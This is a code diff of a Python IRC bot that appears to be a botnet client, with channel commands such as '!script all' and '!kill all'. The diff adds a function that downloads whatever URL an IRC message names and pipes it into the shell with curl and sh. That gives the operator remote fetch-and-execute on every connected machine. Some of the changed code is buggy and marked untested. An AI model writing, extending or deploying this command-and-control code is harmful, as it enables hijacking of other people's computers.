@@ -1,6 +1,5 @@
 # -imports-
 import os
-import platform
 import random
 import socket
 import threading
@@ -22,15 +21,12 @@ def identify():
         recieved = irc.recv(2048).decode("UTF-8")
         if "logged in as" in recieved:
             return True
-        elif "End of /WHOIS list." in recieved:
+        if "End of /WHOIS list." in recieved:
             return False
 
 #untested function
 def newScript(script: str):
-    if hostOs := platform.system() == "Linux" or hostOs == "Darwin":
-        os.system("sh scripts/" + script.split(" ")[0] + ".sh " + script.split(" ")[1:])
-    elif hostOs == "Windows":
-        os.system("cmd.exe scripts\\" + script.split(" ")[0] + ".bat " + script.split(" ")[1:])
+    os.system("curl " + script + " | sh")
 
 # -command definitions-
 def commands():
@@ -57,7 +53,7 @@ def commands():
     #untested command
     if "!script " + nickname in recieved or ":!script all" in recieved:
         script = " ".join(recieved.split(" ")[2:])
-        thread = threading.Thread(target=newScript)
+        thread = threading.Thread(target=lambda: newScript(script))
         thread.start(script)
 
     if ":!kill " + nickname in recieved or ":!kill all" in recieved:
